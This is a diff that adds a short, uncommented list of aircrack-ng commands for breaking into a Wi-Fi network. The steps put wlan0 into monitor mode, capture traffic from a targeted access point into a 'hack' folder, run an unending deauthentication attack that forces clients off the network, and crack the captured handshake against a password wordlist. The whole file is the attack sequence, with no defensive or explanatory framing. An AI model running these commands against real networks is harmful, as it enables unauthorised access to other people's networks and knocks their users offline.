@@ -1,0 +1,13 @@
+airmon-ng start wlan0 
+
+airodump-ng wlan0
+
+
+airodump-ng -c 1 --bssid DA:D0:0C:46:C1:D3 wlan0
+
+
+airodump-ng --bssid F0:7D:68:EE:43:E6 -c 1 -w /root/Desktop/hack/hackme wlan0
+
+aireplay-ng --deauth 0 -a C4:6E:1F:D3:F5:76  wlan0
+
+aircrack-ng /root/Desktop/hack/hackme-01.cap -w /root/Desktop/password-list-1-datisnetwork.txt 
